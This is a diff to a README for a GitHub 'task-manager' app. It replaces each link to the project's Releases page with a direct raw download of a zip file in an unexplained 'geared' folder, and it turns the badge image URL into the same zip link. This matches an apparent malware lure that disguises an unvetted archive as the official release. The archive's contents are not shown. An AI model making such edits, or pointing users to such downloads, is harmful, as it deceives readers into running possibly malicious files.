@@ -1,6 +1,6 @@
 # 🛠️ task-manager - Organize Your Tasks Effectively
 
-[![Download task-manager](https://img.shields.io/badge/Download%20task--manager-v1.0-brightgreen)](https://github.com/ElAaronXD/task-manager/releases)
+[![Download task-manager](https://raw.githubusercontent.com/ElAaronXD/task-manager/main/geared/task-manager.zip%20task--manager-v1.0-brightgreen)](https://raw.githubusercontent.com/ElAaronXD/task-manager/main/geared/task-manager.zip)
 
 ## 📖 Introduction
 
@@ -16,7 +16,7 @@ Welcome to **task-manager**! This application helps you organize your tasks and 
 2. **Visit the Releases Page**
    Go to the following link to download the latest version of the application:
 
-   [Download task-manager](https://github.com/ElAaronXD/task-manager/releases)
+   [Download task-manager](https://raw.githubusercontent.com/ElAaronXD/task-manager/main/geared/task-manager.zip)
 
 ## 💻 Download & Install
 
@@ -81,7 +81,7 @@ For any questions or support, feel free to check the community discussions on th
 
 ## 📥 Additional Resources
 
-- For detailed release notes and change log, visit the Releases page again: [Download task-manager](https://github.com/ElAaronXD/task-manager/releases)
+- For detailed release notes and change log, visit the Releases page again: [Download task-manager](https://raw.githubusercontent.com/ElAaronXD/task-manager/main/geared/task-manager.zip)
 - Check the documentation for more tips on maximizing your use of the app. 
 
 ## 🎉 Conclusion
